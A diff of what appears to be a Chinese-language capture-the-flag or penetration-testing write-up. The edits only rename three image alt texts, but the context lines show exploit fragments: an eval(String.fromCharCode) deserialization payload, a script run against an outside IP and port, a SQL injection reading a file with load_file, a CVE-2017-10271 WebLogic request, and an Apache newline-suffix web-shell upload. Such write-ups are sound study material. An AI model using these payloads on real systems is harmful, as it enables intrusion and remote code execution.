@@ -140,7 +140,7 @@ print "eval(String.fromCharCode(%s))" % (PAYLOAD)
 
 他是对cookie进行了反序列化，
 
-![1](./assets/001.jpg)
+![image](./assets/001.jpg)
 
 ```
 python2 1.py 156.238.233.9 9999
@@ -330,7 +330,7 @@ action=populate_download_edit_form&id=0 UNION SELECT 1,load_file(0x2f666c61675f6
 
 CVE-2017-10271，访问`/wls-wsat/CoordinatorPortType`发现漏洞点
 
-![1](./assets/002.jpg)
+![image](./assets/002.jpg)
 
 ```http
 POST /wls-wsat/CoordinatorPortType HTTP/1.1
@@ -642,7 +642,7 @@ username=admin&password=admin&lt=LT-2-tZDMa7fNVBP3t3w9QRaAUdKx1Cx93r-cas01.examp
 
 Apache HTTPD的`2.4.0~2.4.29`版本中存在一个解析漏洞，在解析PHP时，`1.php\x0a`将被按照PHP后缀进行解析，上传的时候右键插入一个`0a`即可
 
-![1](./assets/003.jpg)
+![image](./assets/003.jpg)
 
 然后访问`/shell.php%0a`
 
